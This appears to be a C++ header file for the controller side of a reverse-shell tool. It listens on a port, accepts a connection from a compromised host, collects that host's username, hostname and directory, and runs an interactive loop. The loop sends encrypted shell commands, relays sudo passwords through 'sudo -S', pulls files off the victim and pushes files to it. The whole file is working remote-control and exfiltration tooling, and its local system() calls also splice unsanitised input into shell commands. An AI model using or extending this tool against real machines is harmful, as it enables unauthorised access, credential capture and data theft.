#ifndef MAINSH
#define MAINSH
// reverse shell header file using IPV4 
// binds socket and listens for incoming connection

#include "utils.hpp"

const unsigned int BUFFER_SIZE = 9999;
std::string DOWNLOAD_DIR = "/home/amir/Downloads";

struct mainsh{
    std::vector<std::string> logs; // stores all the previous commands and exact time

    bool ispw = false; // used to mask password in logs
    std::string maskedpw; // masked password to store in logs

    std::string str_name;
    std::string str_hostname;
    std::string str_dir;

    int bytes_red = 0;
    int bytes_written = 0;

    int* serverptr;

    int global_socket;


    std::string system_output(std::string cmd) {
        std::string data;
        FILE * stream;

        char buffer[BUFFER_SIZE];
        cmd.append(" 2>&1");

        stream = popen(cmd.c_str(), "r");
        if (stream){
        while (!feof(stream)){
            if(fgets(buffer, BUFFER_SIZE, stream) != NULL){ data.append(buffer);}
        }
        pclose(stream);
                
        }
        return data;
 
    }

    // prints previous commands
    void view_logs(){
        for(unsigned int p = 0; p < logs.size(); p++){ std::cout << logs[p] << std::endl; }
    }

    // closes the socket based on argument
    void disconnect(const char arg[]){
        char disconnect[strlen(arg)+1];
        std::string ndisc = ncrypt(arg);
        strcpy(disconnect, ndisc.c_str());

        bytes_written += send(global_socket, (char*)&disconnect, strlen(disconnect), 0);
        close(global_socket);
        close(*(serverptr));

        std::cout << "[+] Bytes written: " << bytes_written << std::endl;
        std::cout << "[+] Bytes red: " << bytes_red << std::endl;

        std::cout << "";

        exit(1);
    }

    void help(){

    }

    // sends buffer to socket and stores it in logs
    void send_bytes(std::string buffer){
        char temp[buffer.length()+1];
        strcpy(temp, ncrypt(buffer).c_str());
        // current date/time based on current system
        time_t now = time(0);
   
        // convert now to string form
        char* dt = ctime(&now);
        bytes_written += send(global_socket, (char*)&temp, strlen(temp), 0);
        std::string timer = "["+std::string(dt).substr(0, strlen(dt)-1)+"] ";
        if(ispw){
            logs.push_back(timer + maskedpw);
            ispw = false;
        }
        else{logs.push_back(timer + dcrypt(temp));}
        
    }

    // creates socket and return pointer
    int* create_socket(unsigned int PORT){
        signal(SIGPIPE, SIG_IGN); // used to handle SIGPIPE, if not ignored it crashes
        char hostname[HOST_NAME_MAX];
        gethostname(hostname, HOST_NAME_MAX);

        sockaddr_in serv_addr;
        bzero((char*)&serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET; // IPV4
        serv_addr.sin_addr.s_addr = htonl(INADDR_ANY); // socket accepts connections to all the IPs of the machine
        serv_addr.sin_port = htons(PORT); 

        int server_sd = socket(AF_INET, SOCK_STREAM, 0);
        serverptr = &server_sd;
        if(server_sd < 0){
            fprintf(stderr, "[-] failed to open socket: %s\n", strerror(errno));
            tempsleep();
        }

        int bind_socket = bind(server_sd, (struct sockaddr*) &serv_addr, sizeof(serv_addr)); //binding socket
        if(bind_socket < 0){
            fprintf(stderr, "[-] failed to bind socket: %s\n", strerror(errno));
            tempsleep();
        }
        
        std::cout << "[+] binding socket as " << hostname << " on port " << PORT << std::endl;
        listen(server_sd, 5); //second argument is backlog queue

        sockaddr_in new_sock_addr;
        socklen_t new_sock_addr_size = sizeof(new_sock_addr);

        int new_server_sd = accept(server_sd, (sockaddr *)&new_sock_addr, &new_sock_addr_size);
        int* ptr_serversd = &new_server_sd;
        global_socket = new_server_sd;
        if(new_server_sd < 0){
            fprintf(stderr, "[-] failed to accept request from client: %s\n", strerror(errno));
            tempsleep();
        }
        std::cout << "[?] socket created at " << ptr_serversd << std::endl;
        struct timeval start1, end1;
        gettimeofday(&start1, NULL);
        
        // shsecond sending account name, hostname and directory
        char client_name[30];
        char client_hostname[30];
        char dir[30];

        // null terminator to stop printing garbage
        memset(client_name, '\0', sizeof(client_name));
        memset(client_hostname, '\0', sizeof(client_hostname));
        memset(dir, '\0', sizeof(dir));

        bytes_red += recv(new_server_sd, (char*)&client_name, sizeof(client_name), 0); // account
        bytes_red += recv(new_server_sd, (char*)&client_hostname, sizeof(client_hostname), 0); // hostname
        bytes_red += recv(new_server_sd, (char*)&dir, sizeof(dir), 0); // directory

        //drcrypt buffers (strlen(var)-1 is to remove \n)
        std::string dcrypt_name = (dcrypt(std::string(client_name))).substr(0, strlen(client_name)-1);
        std::string dcrypt_hostname = (dcrypt(std::string(client_hostname))).substr(0, strlen(client_hostname)-1);
        std::string dcrypt_dir = (dcrypt(std::string(dir))).substr(0, strlen(dir)-1);

        str_name = dcrypt_name;
        str_hostname = dcrypt_hostname;
        str_dir = dcrypt_dir;

        std::cout << "[+] received connection from " <<  str_hostname << std::endl;

        struct hostent *getipv4; //gethostbyname returns a pointer of type hostent
        getipv4 = gethostbyname(str_hostname.c_str());
        printf("[?] client addr: %s\n", inet_ntoa(*(struct in_addr*)getipv4->h_addr));
        
        return ptr_serversd;
    } 
    // creates the interactive shell
    void createsh(){
        char buffer[BUFFER_SIZE];

        std::string cmd;
        // do something about write-protected directory (IMPORTANT)

        while(true){
            std::cout << str_name << "@" << str_hostname << ":" << str_dir << "$ ";
            std::getline(std::cin, cmd);

            std::string arg = cmd.substr(0, cmd.find(" "));
            // a lot of else if
            if(cmd == "disconnect"){ disconnect("disconnect");} // close connection (secondsh still on)
            else if(cmd == "stoprocess"){ disconnect("stoprocess");} // close connection (secondsh goes off)
            else if(cmd == "logs"){view_logs();}
            else if(cmd == "clear" || cmd == "cls"){system("clear");}
            else if(cmd.length() == 0){continue;}

            else if(arg == "sudo"){
                std::string su_cmd = cmd.substr(5, cmd.length()); // super user command
                
                /*
                std::cout << "[sudo] password for " << str_name << ": ";

                std::getline(std::cin, pw);
                */
                std::string str = "[sudo] password for " + std::string(str_name) + ": ";
                char* pw = getpass(str.c_str());

                memset(&buffer, 0x00, sizeof(buffer));
                
                std::string sudo_command = ("echo ") + std::string(pw) + (" | sudo -S -k ") +  cmd;
                ispw = true;
                maskedpw = ("echo ***** | sudo -S -k " +  cmd);

                send_bytes(sudo_command);

                bytes_red += recv(global_socket, (char*)&buffer, sizeof(buffer), 0);
                std::cout << dcrypt(std::string(buffer)) << std::endl;

            }

            else if(arg == "cd"){
                std::string next_dir = cmd.substr(3, cmd.length());
                send_bytes("dir " + next_dir);

                bytes_red += recv(global_socket, (char*)&buffer, sizeof(buffer), 0);
                // std::cout << dcrypt(std::string(buffer).substr(0, strlen(buffer)-1)) << std::endl;
                std::string err = "dir: cannot access '"+next_dir+"': No such file or directory";

                if(std::string(buffer).substr(0, strlen(buffer)-1) != err){
                    str_dir = next_dir;
                }
                memset(&buffer, 0x00, sizeof(buffer));
            }

            // managing the download directory
            else if(arg == "downloadir" || arg == "showdownloadir"){
                std::string dir = cmd.substr(11, cmd.length());
                std::string dir_cmd = "if test -d "+dir+"; then echo \"exist\"; fi ";

                if(arg == "showdownloadir"){ std::cout << "DOWNLOAD_DIR = " << DOWNLOAD_DIR << std::endl;}

                // checks if dir exists
                else if(system_output(dir_cmd).substr(0, system_output(dir_cmd).length()-1) == "exist"){
                    std::cout << "[+] download directory has been changed from " << DOWNLOAD_DIR << " to " << dir << std::endl;
                    DOWNLOAD_DIR = dir;
                }

                // if not error message
                else{std::cout << "[-] directory does not exist" << std::endl;}
            }

            // download file (text based)
            else if(arg == "download"){
                //$ download (file dir)
                std::string file_cmd = "touch " + std::string(DOWNLOAD_DIR) + cmd.substr(9, cmd.length());
                std::string f = std::string(DOWNLOAD_DIR) + "/" + cmd.substr(9, cmd.length());
                std::cout << "file downloaded at: " << f << std::endl;
                send_bytes(cmd);
                bytes_red += recv(global_socket, (char*)&buffer, sizeof(buffer), 0);
                system(file_cmd.c_str());
                
                std::ofstream file;
                file.open(f);
                file << dcrypt(buffer) << std::endl;// dcrypting buffer
                file.close();
            }

            // updload files (text based)
            else if(arg == "upload"){
                try{
                    send_bytes(cmd);
                    //$ upload (file dir) (desired dir) (name)
                    std::vector<std::string> vec = split(cmd, ' ');
                    std::string file_dir = vec[1];
                    std::string desired_dir = vec[2];
                    // std::string file_name = vec[3];

                    // fetch data using system_output
                    std::string dt_file = system_output("cat "+file_dir);
                    // send it 
                    send_bytes(dt_file.c_str());
                }

                catch(...){ std::cout << "[-] unfortunately that didn't work out..." << std::endl;}
            }
            
            else if(arg == "help"){ help();}

            // sends command
            else{
                std::string ncmd = ("cd " + str_dir + " && " + cmd);
                send_bytes(ncmd);
                
                bytes_red += recv(global_socket, (char*)&buffer, sizeof(buffer), 0);
                std::string tempbuff = std::string(buffer).substr(0, strlen(buffer)-1);
                std::cout << dcrypt(tempbuff) << std::endl;
                memset(&buffer, 0x00, sizeof(buffer));
            }
        }
    
        
    }



};

#endif
